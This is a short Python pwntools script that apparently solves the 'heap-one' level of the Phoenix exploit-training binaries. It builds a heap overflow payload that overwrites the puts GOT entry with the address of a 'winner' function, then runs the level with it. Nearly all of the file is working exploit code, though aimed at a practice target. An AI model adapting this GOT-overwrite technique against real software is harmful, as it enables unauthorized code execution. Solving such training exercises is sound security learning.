from pwn import *


arch = "i486"


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


def run_with_args(level, args):
    index = 0
    args_string = ""
    for arg in args:
        filename = "/tmp/docgil" + str(index)
        write(filename, arg)
        print("payload"+str(index)+": ")
        print(read(filename))
        args_string += " \"`cat " + filename + "`\""
        index += 1

    io = process("/opt/phoenix/" + arch + "/" + level + args_string, shell=True)
    return io.recvall()


winner_function_adr = pack(0x0804889a, 32)
puts_got_adr = pack(0x804c140, 32)
arg1 = b""

# name
arg1 += 8 * b"A"
# meta data of next chunk
arg1 += 8 * b"B"
# prio next chunk
arg1 += 4 * b"C"
arg1 += puts_got_adr

arg2 = b""
arg2 += winner_function_adr
r = run_with_args("heap-one", [arg1, arg2])
print(r)